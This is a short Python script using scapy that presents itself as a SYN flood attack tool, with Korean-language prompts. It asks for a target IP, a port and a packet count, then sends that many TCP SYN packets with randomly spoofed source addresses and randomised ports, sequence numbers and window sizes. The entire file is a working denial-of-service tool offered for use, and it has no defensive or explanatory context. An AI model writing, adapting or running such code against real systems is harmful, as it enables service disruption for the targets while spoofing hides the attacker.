#!/usr/bin/python3
# Syn Flood Tool Python3

from scapy.all import *
import os
import random


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):
    total = 0
    print("공격 실행...")
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet / TCP_Packet, verbose=0)
        total += 1
    print("\n[*] 전체 송신 패킷 수 : %i\n" % total)


def info():
    os.system("clear")
    print("설명 : SYN Flood 공격 도구 입니다")
    print("문의 : gump71036969@gmail.com")

    dstIP = input("\n[*] 목표의 IP : ")
    dstPort = input("[*] 목표의 Port : ")

    return dstIP, int(dstPort)


def main():
    dstIP, dstPort = info()
    counter = input("[*] 보낼 패킷의 갯수 : ")
    try:
        SYN_Flood(dstIP, dstPort, int(counter))
    except KeyboardInterrupt:
        print("공격중지...")


main()